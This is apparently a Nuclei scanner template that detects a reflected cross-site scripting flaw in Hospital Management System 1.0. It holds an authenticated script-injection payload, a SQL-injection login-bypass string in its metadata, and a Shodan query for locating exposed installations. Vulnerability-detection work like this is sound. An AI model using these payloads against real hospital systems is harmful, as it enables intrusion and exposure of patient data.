id: hospital-management-xss2
info:
  author: arafatansari
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: 'Hospital Management System 1.0 contains a cross-site scripting vulnerability
    via the searchdata parameter in patient-search.php.

    '
  metadata:
    comment: Login bypass is also possible using the payload - admin'+or+'1'%3D'1'
      in username.
    shodan-query: http.html:"Hospital Management System"
    verified: true
  name: Hospital Management System 1.0 - Cross-Site Scripting
  reference:
  - https://vulmon.com/vulnerabilitydetails?qid=CVE-2021-39411&scoretype=cvssv3
  severity: high
  tags: hms,hospital,cms,xss,authenticated
requests:
- cookie-reuse: true
  matchers:
  - condition: and
    dsl:
    - contains(all_headers_2, "text/html")
    - status_code_2 == 200
    - contains(body_2, 'Result against \"<script>alert(document.domain)</script>\"
      keyword')
    type: dsl
  raw:
  - 'POST /hms/admin/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}&submit=

    '
  - 'POST /hms/admin/patient-search.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    searchdata=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&search=

    '
  req-condition: true
